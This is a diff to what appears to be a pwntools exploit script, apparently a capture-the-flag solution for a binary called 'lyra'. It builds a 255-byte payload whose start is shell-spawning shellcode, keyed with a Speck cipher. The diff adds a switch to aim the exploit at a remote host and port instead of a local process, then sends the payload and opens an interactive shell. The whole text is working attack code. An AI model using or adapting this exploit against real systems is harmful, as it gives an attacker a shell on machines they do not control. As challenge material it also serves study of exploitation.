@@ -61,6 +61,9 @@ def sanity():
 
 sanity()
 
+if args.WRONG_KEY:
+  ACTUAL_KEY[0] = 114514
+
 cipher = Speck(p64(ACTUAL_KEY[0]) + p64(ACTUAL_KEY[1]))
 payload = flat({
   0: asm(shellcraft.sh()),
@@ -68,10 +71,12 @@ payload = flat({
 }, length=255)
 assert b"\n" not in payload
 
-# sys.stdout.buffer.write(payload)
+if args.REMOTE:
+  r = remote(args.HOST, args.PORT)
+else:
+  r = process(args.EXE or os.path.realpath("./lyra"))
 
-r = process(os.path.realpath("./lyra"))
 r.recvuntil(b"Input password: ")
-time.sleep(3)
+time.sleep(int(args.DELAY or 3))
 r.sendline(payload)
 r.interactive()
